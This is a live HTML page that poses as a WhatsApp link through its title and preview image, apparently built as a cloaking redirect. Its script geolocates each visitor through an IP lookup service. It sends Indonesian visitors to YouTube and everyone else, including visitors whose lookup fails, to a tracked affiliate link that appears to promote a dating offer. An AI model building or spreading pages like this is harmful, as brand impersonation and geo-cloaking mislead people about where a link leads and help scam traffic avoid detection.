<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <title>📞 WhatsApp online ❣️</title>
  <meta name="description" content="Geo redirect page." />

  <!-- Social Preview -->
  <meta property="og:title" content="📞 WhatsApp online ❣️" />
  <meta property="og:description" content="Redirecting based on your location." />
  <meta property="og:image" content="https://cdn6.aptoide.com/imgs/c/7/6/c7644008f58970f3d495d2d68958652a_fgraphic.png" />
  <meta property="og:type" content="website" />
  <meta property="og:url" content="https://bellsapira.com/" />

  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="Redirect Page" />
  <meta name="twitter:description" content="Geo-based redirect." />
  <meta name="twitter:image" content="https://iili.io/KTfESYF.md.png" />

  <script>
    const youtubeURL = "https://www.youtube.com/";
    const destinationURL = "https://rnqkdz.match2connects.com/?utm_source=da57dc555e50572d&ban=other&j6=1&s1=217489&s2=2173837&s3=kuntul&click_id=kuntul";

    fetch("https://ipapi.co/json/")
      .then(res => res.json())
      .then(data => {
        const country = data.country_code; // contoh: "ID"
        if (country === "ID") {
          window.location.href = youtubeURL;
        } else {
          window.location.href = destinationURL;
        }
      })
      .catch(() => {
        // fallback: redirect ke destination
        window.location.href = destinationURL;
      });
  </script>
</head>

</html>
